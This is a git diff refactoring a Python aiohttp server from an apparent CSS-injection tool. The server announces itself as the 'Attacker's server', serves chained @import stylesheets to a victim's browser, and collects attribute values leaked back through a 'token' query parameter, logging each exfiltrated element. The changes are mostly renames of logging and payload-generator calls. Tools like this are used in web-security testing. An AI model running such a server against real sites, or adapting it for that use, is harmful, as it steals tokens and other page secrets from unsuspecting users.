@@ -2,11 +2,10 @@ import string
 import random
 from aiohttp import web
 import asyncio
-from cssinj import log
-from cssinj.injection import generate_injection
+from cssinj import console, injection
 
 
-class CssInjector:
+class CSSInjector:
     def __init__(self):
         self.data = ""
         self.elements = []
@@ -24,24 +23,24 @@ class CssInjector:
         web.run_app(
             self.app,
             port=self.port,
-            print=log.message(
+            print=console.log(
                 "server", f"Attacker's server started on {args.hostname}:{args.port}"
             ),
         )
 
     async def handle_start(self, request):
-        log.message("connection", f"Connection from {request.remote}")
+        console.log("connection", f"Connection from {request.remote}")
         if self.show_details:
             for key, value in request.headers.items():
-                log.message("connection_details", f"{key} : {value}")
+                console.log("connection_details", f"{key} : {value}")
         self.event.set()
         return web.Response(
-            text=f"@import url('//{self.hostname}:{self.port}/next?num={random.random()}'); ",
+            text=injection.generate_next_import(self.hostname, self.port),
             content_type="text/css",
         )
 
     async def handle_end(self, request):
-        log.message(
+        console.log(
             "end_exfiltration",
             f"The {self.selector} exfiltrated from {self.identifier} is : {self.data}",
         )
@@ -59,7 +58,7 @@ class CssInjector:
         self.event.clear()
         self.counter_req += 1
         return web.Response(
-            text=generate_injection(
+            text=injection.generate_payload(
                 hostname=self.hostname,
                 port=self.port,
                 data=self.data,
@@ -75,7 +74,7 @@ class CssInjector:
         self.event.set()
         self.data = request.query.get("token")
         if self.show_details:
-            log.message(
+            console.log(
                 "exfiltration",
                 f"Exfiltrating element {len(self.elements)} : {self.data}",
             )
